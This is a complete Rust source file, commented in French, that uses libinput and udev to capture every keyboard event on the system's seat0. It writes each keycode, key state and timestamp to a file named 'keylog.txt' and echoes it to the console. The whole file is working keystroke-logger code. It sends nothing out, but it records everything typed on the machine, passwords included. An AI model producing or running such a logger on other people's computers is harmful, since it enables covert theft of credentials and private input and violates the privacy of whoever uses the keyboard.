use input::{Libinput, LibinputInterface, event::Event};
use input::event::keyboard::KeyboardEventTrait; // Import du trait nécessaire
use std::fs::OpenOptions;
use std::os::unix::io::OwnedFd;
use std::path::Path;
use std::time::Duration;
use std::{thread, io::Write};

struct Interface;

impl LibinputInterface for Interface {
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<OwnedFd, i32> {
        OpenOptions::new()
            .read((flags & libc::O_RDONLY != 0) || (flags & libc::O_RDWR != 0))
            .write((flags & libc::O_WRONLY != 0) || (flags & libc::O_RDWR != 0))
            .open(path)
            .map(|file| file.into())
            .map_err(|err| err.raw_os_error().unwrap_or(-1))
    }

    fn close_restricted(&mut self, fd: OwnedFd) {
        drop(fd);
    }
}

fn main() {
    // Initialiser libinput avec udev
    let mut libinput = Libinput::new_with_udev(Interface);
    libinput.udev_assign_seat("seat0").expect("Impossible d'assigner le siège");

    // Ouvrir un fichier pour enregistrer les frappes
    let mut log_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .expect("Impossible d'ouvrir le fichier de log");

    // Boucle principale pour traiter les événements
    loop {
        libinput.dispatch().expect("Échec du dispatch de libinput");

        for event in &mut libinput {
            if let Event::Keyboard(keyboard_event) = event {
                let keycode = keyboard_event.key();
                let state = keyboard_event.key_state();
                let timestamp = keyboard_event.time();

                // Enregistrer les informations dans le fichier de log
                writeln!(
                    log_file,
                    "Timestamp: {}, Keycode: {}, State: {:?}",
                    timestamp, keycode, state
                )
                .expect("Impossible d'écrire dans le fichier de log");

                // Afficher les informations dans la console
                println!(
                    "Timestamp: {}, Keycode: {}, State: {:?}",
                    timestamp, keycode, state
                );
            }
        }
    }
}
